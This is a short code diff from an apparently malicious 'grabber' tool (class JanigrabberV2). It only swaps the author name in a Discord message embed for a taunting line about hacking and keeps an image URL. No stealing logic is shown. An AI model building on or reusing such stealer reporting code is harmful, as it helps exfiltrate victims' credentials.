@@ -1322,7 +1322,7 @@ class JanigrabberV2(functions):
             "embeds": [
                      {
                          "author": {
-                             "name": "life 😎",
+                             "name": "Hacking Life Is To Crazy Right Jani hmm😎",
                              "url": "",
                              "icon_url": "https://media.discordapp.net/attachments/1209457154268864525/1212345763695296512/Artificial_Intelligence_and_the_Future_of_Humans.jpg?ex=65f17ffa&is=65df0afa&hm=330a951c385755287b0cda6ae4e0bdc27c2db959fb9e139698f1145209302430&=&format=webp"
                          },
